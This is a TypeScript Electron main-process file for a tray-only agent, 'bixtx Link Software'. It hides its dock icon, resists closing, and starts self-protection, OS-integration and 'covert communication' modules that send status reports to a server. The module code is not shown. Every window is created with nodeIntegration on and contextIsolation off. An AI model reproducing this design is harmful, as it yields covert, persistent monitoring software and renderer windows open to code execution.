import { app, BrowserWindow, Tray, Menu, nativeImage } from 'electron';
import path from 'path';
import { DeviceManager } from './core/DeviceManager';
import { ConnectionManager } from './core/ConnectionManager';
import { MonitoringService } from './services/MonitoringService';
import { SecurityManager } from './core/SecurityManager';
import { ConfigManager } from './core/ConfigManager';
import { SelfProtectionManager } from './core/SelfProtectionManager';
import { OSIntegrationManager } from './core/OSIntegrationManager';
import { CovertCommunicationManager } from './core/CovertCommunicationManager';
import { MilitaryGradeIntegrationService } from './services/MilitaryGradeIntegrationService';
import { Logger } from './utils/Logger';

class BixtxLinkApp {
  private tray: Tray | null = null;
  private mainWindow: BrowserWindow | null = null;
  private deviceManager!: DeviceManager;
  private connectionManager!: ConnectionManager;
  private monitoringService!: MonitoringService;
  private securityManager!: SecurityManager;
  private configManager!: ConfigManager;
  private selfProtectionManager!: SelfProtectionManager;
  private osIntegrationManager!: OSIntegrationManager;
  private covertCommsManager!: CovertCommunicationManager;
  private militaryGradeIntegration!: MilitaryGradeIntegrationService;
  private logger: Logger;
  private shuttingDown = false;

  constructor() {
    // 1. Bootstrap logger first — zero external dependencies
    this.logger = new Logger('BixtxLinkApp', 'info');

    // 2. Harden process boundary before any subsystem initializes
    this.hardenProcess();

    // 3. Defer heavy init until Electron runtime is ready
    app.whenReady()
      .then(() => this.initialize())
      .catch((err) => {
        this.logger.fatal('RUNTIME_READY_FAILURE', err);
        this.emergencyShutdown(1);
      });
  }

  /** Install global exception shields and graceful-shutdown interceptors. */
  private hardenProcess(): void {
    process.on('uncaughtException', (err) => {
      this.logger.fatal('UNCAUGHT_EXCEPTION', {
        message: err.message,
        stack: err.stack,
        type: err.name,
      });
      this.emergencyShutdown(1);
    });

    process.on('unhandledRejection', (reason) => {
      this.logger.error('UNHANDLED_REJECTION', {
        reason: reason instanceof Error ? reason.message : String(reason),
      });
    });

    // Intercept quit to perform async cleanup
    app.on('before-quit', (event) => {
      if (!this.shuttingDown) {
        event.preventDefault();
        this.shuttingDown = true;
        this.gracefulShutdown().catch(() => this.emergencyShutdown(1));
      }
    });

    // Background-only mode (tray)
    app.on('window-all-closed', (event) => {
      event.preventDefault();
    });
  }

  private async initialize(): Promise<void> {
    try {
      if (process.platform === 'darwin') {
        app.dock.hide();
      }

      this.logger.info('BOOT_SEQUENCE_START', {
        version: '1.0.0-MG',
        platform: process.platform,
        arch: process.arch,
        pid: process.pid,
      });

      // Phase 0: Configuration
      this.configManager = new ConfigManager();

      // Phase 1: Security foundation
      await this.logger.withContext({ phase: 'security' }, async () => {
        this.securityManager = new SecurityManager(this.configManager);
        await this.securityManager.initialize();
      });

      // Phase 2: Device & network fabric
      await this.logger.withContext({ phase: 'network' }, async () => {
        this.deviceManager = new DeviceManager(this.configManager);
        this.connectionManager = new ConnectionManager(
          this.configManager,
          this.securityManager
        );
        await this.deviceManager.initialize();
        await this.connectionManager.initialize();
      });

      // Phase 3: Military-grade protection systems
      await this.logger.withContext({ phase: 'protection' }, async () => {
        this.selfProtectionManager = new SelfProtectionManager(this.configManager);
        this.osIntegrationManager = new OSIntegrationManager(this.configManager);
        this.covertCommsManager = new CovertCommunicationManager(
          this.securityManager,
          this.configManager
        );

        await this.selfProtectionManager.initialize();
        await this.osIntegrationManager.initialize();
        await this.covertCommsManager.initialize();
      });

      // Phase 4: Cross-system integration (Software B)
      await this.logger.withContext({ phase: 'integration' }, async () => {
        this.militaryGradeIntegration = new MilitaryGradeIntegrationService(
          this.selfProtectionManager,
          this.osIntegrationManager,
          this.covertCommsManager,
          this.connectionManager
        );
        await this.militaryGradeIntegration.initialize();
      });

      // Phase 5: Monitoring & telemetry
      this.monitoringService = new MonitoringService(
        this.deviceManager,
        this.connectionManager
      );
      await this.monitoringService.start();

      // Phase 6: Covert status report
      await this.covertCommsManager.reportCritical(
        'Software A initialized successfully',
        {
          version: '1.0.0-MG',
          platform: process.platform,
          pid: process.pid,
          loggerStatus: this.logger.status(),
        }
      );

      // Phase 7: UI layer
      this.createTray();

      // Phase 8: Registration gate
      if (!this.configManager.isDeviceRegistered()) {
        this.logger.info('REGISTRATION_REQUIRED');
        this.showRegistrationWindow();
      } else {
        this.logger.info('CONNECTING_TO_SERVER');
        await this.connectionManager.connect();
      }

      this.logger.info('BOOT_SEQUENCE_COMPLETE');
    } catch (error) {
      this.logger.fatal('BOOT_SEQUENCE_FAILURE', error);
      this.emergencyShutdown(1);
    }
  }

  private createTray(): void {
    try {
      const icon = nativeImage.createFromDataURL(
        'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAA7AAAAOwBeShxvQAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAJESURBVFiF7ZbPaxNBFMc/b7ObTZq0aUxiY6tFRfBSELyIePDkxZMXL/4B/gP+A/4FXrx58OhBUEQQxIMgCIIgKFhbq9Zqk6ZNm2STbDabzXhnN5s0u0lT8SD0wYOdmZ3vfL/vzZvdB/+zWgBYlnUNuA6MhPvRKcuyrCWl1Hs/xgA+A08B8+xlxdTjaYCZSqV6AOh0OiQSCWzbRggB0O12KZfLAGiadhP4qpR66AkAM4ODg3S7XVKpFJFIBNM0WVlZYXNzE4D19XUAhBBngS3P6ADQarXI5/PYto1pmoTDYSYnJxkdHQVgeXmZtbU1T/ITqP4zAdTrdQqFAgC1Wg3DMNjb28M0Tb+kJwCIx+Ok02mklBweHvL+/XsATp06RbVaxTAMhBBHuU/K84parQbA9vY2SinC4TDj4+O0Wi22t7c5PDw8yn+SAL0VDMPA8haPf0II+v3+cfnghBP09fUBYNs2e3t7tFotAFKpFJFIhP39fXZ2djzxfwUglUoxMTFBJpNBSkk8HieRSFAsFrlz5w5Hjpfn+mMSa6Ojo0xPT5PNZjEMg2KxyPz8PAC5XA4ADxZI7+joKACTk5NMTU0RjUa5f/8+L168YGFhgVwuB8DMzAxKqTuH0WiUeDzO2NgYpmny9OlT5ufnkVKSTqfJ5/MAXL16FaXU55319Vqy2SwvX77kxYsXCCEIhUIMDAxQqVQA+PDhA5VKJQA8ODg4B3zxS/4WL6SUJ6XU5+nT09PA5X6/P2rbNkopADY2NpiZmeGEehX8e5/2n/UL+AFkk3hj3LQAAAAASUVORK5CYII='
      );

      this.tray = new Tray(icon);
      this.tray.setToolTip('bixtx Link Software');
      this.updateTrayMenu();

      this.tray.on('click', () => {
        this.mainWindow?.show();
      });
    } catch (err) {
      this.logger.error('TRAY_CREATION_FAILURE', err);
    }
  }

  private updateTrayMenu(): void {
    if (!this.tray) return;

    const isConnected = this.connectionManager?.isConnected() ?? false;
    const isRegistered = this.configManager?.isDeviceRegistered() ?? false;
    const deviceId = this.deviceManager?.getDeviceId() ?? 'Unknown';

    const contextMenu = Menu.buildFromTemplate([
      { label: 'bixtx Link Software (MG)', enabled: false },
      { type: 'separator' },
      {
        label: `Status: ${isConnected ? 'Connected' : isRegistered ? 'Disconnected' : 'Not Registered'}`,
        enabled: false,
      },
      { label: `Device ID: ${deviceId}`, enabled: false },
      { type: 'separator' },
      {
        label: 'Show Registration Code',
        click: () => this.showRegistrationWindow(),
        enabled: !isRegistered,
      },
      { label: 'Settings', click: () => this.showSettingsWindow() },
      { label: 'View Logs', click: () => this.showLogsWindow() },
      { type: 'separator' },
      {
        label: 'Reconnect',
        click: () => this.connectionManager?.reconnect(),
        enabled: isRegistered && !isConnected,
      },
      {
        label: 'Unregister Device',
        click: () => this.unregisterDevice(),
        enabled: isRegistered,
      },
      { type: 'separator' },
      { label: 'Quit', click: () => app.quit() },
    ]);

    this.tray.setContextMenu(contextMenu);
  }

  public focus(): void {
    if (this.mainWindow && !this.mainWindow.isDestroyed()) {
      this.mainWindow.focus();
    } else {
      this.showRegistrationWindow();
    }
  }

  private showRegistrationWindow(): void {
    if (this.mainWindow && !this.mainWindow.isDestroyed()) {
      this.mainWindow.focus();
      return;
    }

    this.mainWindow = new BrowserWindow({
      width: 500,
      height: 600,
      resizable: false,
      show: false,
      webPreferences: {
        nodeIntegration: true,
        contextIsolation: false,
      },
      title: 'bixtx.com Link - Device Registration',
    });

    this.mainWindow.loadFile(path.join(__dirname, '../pages/registration.html'));

    this.mainWindow.once('ready-to-show', () => {
      this.mainWindow?.show();
    });

    this.mainWindow.on('closed', () => {
      this.mainWindow = null;
    });
  }

  private showSettingsWindow(): void {
    const win = new BrowserWindow({
      width: 600,
      height: 700,
      resizable: false,
      show: false,
      webPreferences: {
        nodeIntegration: true,
        contextIsolation: false,
      },
      title: 'bixtx.com Link - Settings',
    });

    win.loadFile(path.join(__dirname, '../pages/settings.html'));
    win.once('ready-to-show', () => win.show());
  }

  private showLogsWindow(): void {
    const win = new BrowserWindow({
      width: 900,
      height: 700,
      show: false,
      webPreferences: {
        nodeIntegration: true,
        contextIsolation: false,
      },
      title: 'bixtx.com Link - Logs',
    });

    win.loadFile(path.join(__dirname, '../pages/logs.html'));
    win.once('ready-to-show', () => win.show());
  }

  private async unregisterDevice(): Promise<void> {
    try {
      await this.deviceManager.unregister();
      await this.connectionManager.disconnect();
      this.updateTrayMenu();
      this.showRegistrationWindow();
      this.logger.info('DEVICE_UNREGISTERED');
    } catch (error) {
      this.logger.error('DEVICE_UNREGISTER_FAILED', error);
    }
  }

  private async gracefulShutdown(): Promise<void> {
    this.logger.info('SHUTDOWN_SEQUENCE_START');
    try {
      await this.monitoringService?.stop();
      await this.connectionManager?.disconnect();
      await this.logger.close();
    } catch (err) {
      this.logger.error('SHUTDOWN_ERROR', err);
    } finally {
      app.quit();
    }
  }

  private emergencyShutdown(code: number): never {
    this.logger.fatal('EMERGENCY_SHUTDOWN', { exitCode: code });
    process.exit(code);
  }
}

// Single-instance enforcement
const gotTheLock = app.requestSingleInstanceLock();
if (!gotTheLock) {
  app.quit();
} else {
  const instance = new BixtxLinkApp();
  app.on('second-instance', () => instance.focus());
}
